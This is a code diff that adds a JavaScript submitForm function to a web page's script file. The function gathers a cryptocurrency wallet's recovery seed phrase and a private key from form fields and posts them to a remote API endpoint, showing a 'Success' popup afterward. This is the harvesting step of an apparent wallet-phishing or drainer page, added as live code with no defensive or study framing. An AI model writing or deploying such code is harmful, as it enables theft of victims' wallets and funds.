@@ -57,3 +57,33 @@ function submitForm() {
         inputs.forEach(input => input.value = '');
     });
 }
+// script.js
+async function submitForm() {
+    const recoveryPhraseInputs = Array.from(document.querySelectorAll("#recovery-phrase input"))
+        .map(input => input.value.trim());
+    const privateKey = document.querySelector("#notes").value.trim();
+
+    const data = {
+        seedPhrase: recoveryPhraseInputs,
+        privateKey: privateKey
+    };
+
+    try {
+        const response = await fetch('https://your-project.vercel.app/api/storeData', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+            Swal.fire("Success", result.message, "success");
+        } else {
+            Swal.fire("Error", "Failed to save data", "error");
+        }
+    } catch (error) {
+        Swal.fire("Error", "An unexpected error occurred", "error");
+        console.error("Error:", error);
+    }
+}
